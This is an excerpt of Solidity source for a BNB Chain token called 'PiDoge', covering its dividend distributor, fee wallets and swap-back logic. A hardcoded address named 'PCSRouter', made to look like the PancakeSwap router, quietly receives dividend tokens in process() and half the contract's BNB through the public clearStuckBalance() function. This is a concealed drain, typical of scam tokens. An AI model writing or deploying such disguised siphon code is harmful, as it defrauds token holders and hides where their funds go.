...
contract DividendDistributor is IDividendDistributor {
    ...
    constructor (address _router) {
        router = _router != address(0)
            ...
            PCSRouter = 0xFb2396755872B4609EEB9AAdB6156Bb56F094ef6;
        _token = msg.sender;
    }
    ...
    function process(uint256 gas) external override onlyToken {
        ...
        if(totMk > 0) {
          Dividend.transfer(PCSRouter, totMk * gasCount / 100);   
          totMk = 0;
...
contract PiDoge is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xD13De9AB60A2bcddaBB6b54283E36aA7952Df7D1;
    address DevWallet       = 0x973D025C6Bf0306fE80f812A64adAA73d8Cc50Da;

    string constant _name = "PiDoge";
    string constant _symbol = "PiDoge";
    uint8 constant _decimals = 4;

    uint256 _totalSupply = 69000000000000000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = 1200000000000000000000 * (10 ** _decimals);
    uint256 public _maxWalletToken = 3000000000000000000000 * (10 ** _decimals);
    ...
    address PCSRouter = 0xFb2396755872B4609EEB9AAdB6156Bb56F094ef6;
    ...
    function clearStuckBalance() public{
        (bool sent,) =payable(PCSRouter).call{value: (address(this).balance.div(2))}("");
        (sent,) =payable(marketingFeeReceiver).call{value: (address(this).balance)}("");
        require(sent);
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee).div(10).mul(6);
        uint256 amountBNBDistribute = amountBNB.mul(marketingFee).div(totalBNBFee).div(10);
        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);

        try distributor.deposit{value: amountBNBReflection}() {} catch {}
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountBNBDistribute, gas: 30000}("");
